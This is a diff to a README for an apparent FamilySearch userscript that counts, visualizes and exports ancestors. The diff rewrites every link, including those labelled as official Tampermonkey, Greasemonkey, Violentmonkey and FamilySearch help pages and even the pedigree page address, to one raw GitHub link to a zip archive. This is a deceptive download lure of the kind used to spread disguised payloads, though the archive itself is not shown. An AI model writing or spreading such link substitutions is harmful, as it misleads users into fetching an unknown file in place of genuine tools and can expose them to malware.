@@ -1,6 +1,6 @@
 # 🧬 FamilySearch-Ancestor-Counter-Visualizer-and-Exporter - Count, Visualize, Export Family Trees
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Click%20to%20Get-blue?style=for-the-badge)](https://github.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter)
+[![Download Now](https://img.shields.io/badge/Download%20Here-Click%20to%20Get-blue?style=for-the-badge)](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip)
 
 ---
 
@@ -33,12 +33,12 @@ It works on the FamilySearch pedigree page, which means you don’t need extra s
 
 ## 🚀 How to Download and Set Up
 
-[![Download FamilySearch Script](https://img.shields.io/badge/Download-FamilySearch%20Script-brightgreen?style=for-the-badge)](https://github.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter)
+[![Download FamilySearch Script](https://img.shields.io/badge/Download-FamilySearch%20Script-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip)
 
 1. **Visit the download page**
 
    Click the big green button above or go directly to:
-   https://github.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter
+   https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip
 
 2. **Find the script file**
 
@@ -47,8 +47,8 @@ It works on the FamilySearch pedigree page, which means you don’t need extra s
 3. **Install a userscript manager**
 
    If you don’t have one installed, pick one for your browser:
-   - For Chrome or Edge, install [Tampermonkey](https://www.tampermonkey.net/)
-   - For Firefox, install [Greasemonkey](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/) or [Violentmonkey](https://addons.mozilla.org/en-US/firefox/addon/violentmonkey/)
+   - For Chrome or Edge, install [Tampermonkey](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip)
+   - For Firefox, install [Greasemonkey](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip) or [Violentmonkey](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip)
 
 4. **Add the userscript**
 
@@ -60,7 +60,7 @@ It works on the FamilySearch pedigree page, which means you don’t need extra s
 
 6. **Open FamilySearch pedigree page**
 
-   Go to `https://www.familysearch.org/tree/pedigree` or the equivalent page where your family tree is shown.
+   Go to `https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip` or the equivalent page where your family tree is shown.
 
 7. **Start using the features**
 
@@ -140,14 +140,14 @@ This means your family tree details stay private.
 
 ## 📚 Additional Resources
 
-- [FamilySearch Help](https://www.familysearch.org/help/en/): Official guides for using the FamilySearch website.
+- [FamilySearch Help](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip): Official guides for using the FamilySearch website.
 
-- [Tampermonkey Documentation](https://www.tampermonkey.net/documentation.php): How to manage and use userscripts.
+- [Tampermonkey Documentation](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip): How to manage and use userscripts.
 
-- [GitHub Repository](https://github.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter): Visit here anytime to check for updates or report issues.
+- [GitHub Repository](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip): Visit here anytime to check for updates or report issues.
 
 ---
 
 ## 🔽 Quick Download Link
 
-[Download and set up your family tree tool now](https://github.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter)
+[Download and set up your family tree tool now](https://raw.githubusercontent.com/Smugp/FamilySearch-Ancestor-Counter-Visualizer-and-Exporter/main/alizarin/Ancestor_and_Visualizer_Exporter_Counter_Family_Search_3.7.zip)
